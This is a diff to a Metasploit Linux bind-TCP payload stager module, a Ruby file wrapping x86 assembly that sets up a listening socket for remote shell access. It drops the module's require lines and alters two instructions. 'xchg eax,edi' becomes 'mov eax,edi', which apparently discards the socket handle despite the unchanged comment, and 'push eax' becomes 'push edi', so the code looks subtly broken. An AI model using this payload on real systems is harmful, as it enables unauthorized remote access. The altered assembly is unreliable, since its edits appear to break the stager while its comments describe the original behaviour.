@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/linux/send_uuid'
-
 module Msf
 
 
@@ -128,7 +124,7 @@ module Payload::Linux::BindTcp
         push 0x66                     ; socketcall syscall
         pop eax
         int 0x80
-        xchg eax,edi                  ; restore the socket handle
+        mov eax,edi                   ; restore the socket handle
         add esp, 0x14
         pop ecx                       ; restore ecx
 
@@ -170,7 +166,7 @@ module Payload::Linux::BindTcp
         mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
         int 0x80                      ; invoke socketcall
 
-        push eax                      ; stash the listen socket
+        push edi                      ; stash the listen socket
         inc ebx                       ; SYS_ACCEPT
         mov al,0x66                   ; socketcall syscall
         mov [ecx+0x4],edx
